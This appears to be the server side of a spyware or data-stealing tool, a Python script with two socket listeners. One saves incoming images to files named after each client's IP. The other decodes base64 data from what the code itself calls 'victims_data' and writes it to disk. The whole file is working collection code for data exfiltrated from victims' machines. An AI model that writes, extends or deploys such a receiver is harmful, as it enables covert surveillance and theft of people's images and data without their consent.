import socket
import base64

ADDR = "127.0.0.1"
PORT1 = 2001
PORT2 = 2002

socket1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket1.bind((ADDR, PORT1))
socket1.listen()

socket2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket2.bind((ADDR, PORT2))
socket2.listen()

while True:
    clientsocket1, clientIp1 = socket1.accept()
    print("[!] Connection from {}".format(clientIp1))
    file1 = open("{}.jpg".format(clientIp1), "wb")
    image_chunk = clientsocket1.recv(4096)

    while image_chunk:
        file1.write(image_chunk)
        image_chunk = clientsocket1.recv(4096)
    file1.close()
    clientsocket2, clientIp2 = socket2.accept()
    encoded_data = clientsocket2.recv(4096)
    victims_data = base64.b64decode(encoded_data)
    data_decoded = victims_data.decode()
    print(data_decoded)

    file2 = open("{}.txt".format(clientIp1), "wb")
    file2.write(victims_data)
    file2.close()
